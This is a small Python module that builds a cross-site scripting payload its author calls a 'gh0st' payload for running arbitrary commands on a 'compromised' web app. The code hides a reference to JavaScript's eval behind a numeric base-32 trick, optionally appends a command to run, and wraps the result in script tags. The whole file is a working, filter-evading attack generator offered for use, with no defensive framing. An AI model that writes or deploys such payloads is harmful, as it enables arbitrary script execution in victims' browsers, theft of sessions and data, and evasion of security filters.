"""My favorite XSS "gh0st" payload to run basically anything."""

from __future__ import annotations
__all__ = ["generate"]

def generate(
    tags: bool = False,
    command: str | None = None,
) -> str:
    """
    Gh0st XSS payload to execute commands.
    
    Params:
    - tags: If true, wrap the payload in <script></script> tags.
    - command: Optional but if you pass it, it will auto execute the command. If you do not pass it you should be able to still call it on the compromised ap by calling `fn(\"Your-Command\")`.
    
    Returns:
    - Rendered payload string.

    """
    gh0st = f"var fn=window[490837..toString(1<<5)];"
    if command:
        gh0st = f"{gh0st}fn('{command}')"
    if tags:
        gh0st = f"<script>{gh0st}</script>"
    return gh0st
